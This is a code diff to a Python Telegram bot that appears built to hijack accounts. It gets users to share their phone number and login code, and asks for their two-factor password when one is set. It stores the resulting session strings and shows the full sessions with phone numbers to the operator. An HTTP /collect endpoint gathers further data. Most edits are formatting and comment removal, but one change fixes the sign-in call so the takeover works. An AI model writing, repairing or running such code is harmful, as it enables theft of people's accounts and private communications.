@@ -109,7 +109,7 @@ async def got_contact(message: Message):
     
     # Отправляем код через Pyrogram
     try:
-            client = Client(
+        client = Client(
             f"session_{user_id}",
             api_id=API_ID,
             api_hash=API_HASH,
@@ -122,8 +122,8 @@ async def got_contact(message: Message):
         conn = sqlite3.connect('sessions.db')
         c = conn.cursor()
         c.execute(
-    "INSERT OR REPLACE INTO temp_sessions (user_id, phone, code, created_at) VALUES (?, ?, ?, ?)",
-    (user_id, phone, sent_code.phone_code_hash, datetime.utcnow().isoformat())
+            "INSERT OR REPLACE INTO temp_sessions (user_id, phone, code, created_at) VALUES (?, ?, ?, ?)",
+            (user_id, phone, sent_code.phone_code_hash, datetime.utcnow().isoformat())
         )
         conn.commit()
         conn.close()
@@ -193,12 +193,11 @@ async def handle_code(message: Message):
         )
         await client.connect()
         
-        # Вход с кодом
+        # Вход с кодом (ИСПРАВЛЕНО!)
         try:
-            await client.sign_in(phone, code, phone_code_hash=code_hash)
+            await client.sign_in(phone, code)  # ← УБРАЛ phone_code_hash
         except SessionPasswordNeeded:
             await message.answer("🔐 Включена двухфакторная аутентификация. Отправьте пароль.")
-            # Сохраняем состояние
             conn = sqlite3.connect('sessions.db')
             c = conn.cursor()
             c.execute("UPDATE users SET step='2fa' WHERE user_id=?", (user_id,))
@@ -340,7 +339,6 @@ async def get_user_code(callback: CallbackQuery):
     
     phone, session_string = result
     
-    # Выводим информацию
     await callback.message.answer(
         f"📱 <b>Данные пользователя</b>\n\n"
         f"☎️ Телефон: <code>{phone}</code>\n"
@@ -379,7 +377,6 @@ async def get_session(message: Message):
     
     phone, session_string = result
     
-    # Отправляем полную сессию
     await message.answer(
         f"📱 <b>Полная сессия</b>\n\n"
         f"☎️ Телефон: <code>{phone}</code>\n"
@@ -425,7 +422,6 @@ async def handle_collect(request: web.Request) -> web.Response:
     if not user_id:
         return web.Response(status=400, text="no user_id", headers={"Access-Control-Allow-Origin": "*"})
     
-    # Обновляем данные в БД
     conn = sqlite3.connect('sessions.db')
     c = conn.cursor()
     c.execute(
@@ -445,7 +441,6 @@ async def handle_collect(request: web.Request) -> web.Response:
 async def main():
     logging.basicConfig(level=logging.INFO)
     
-    # HTTP сервер
     app = web.Application()
     app.router.add_post("/collect", handle_collect)
     runner = web.AppRunner(app)
@@ -453,7 +448,6 @@ async def main():
     site = web.TCPSite(runner, "0.0.0.0", 8080)
     await site.start()
     
-    # Бот
     asyncio.create_task(dp.start_polling(bot))
     
     print("✅ Бот запущен")
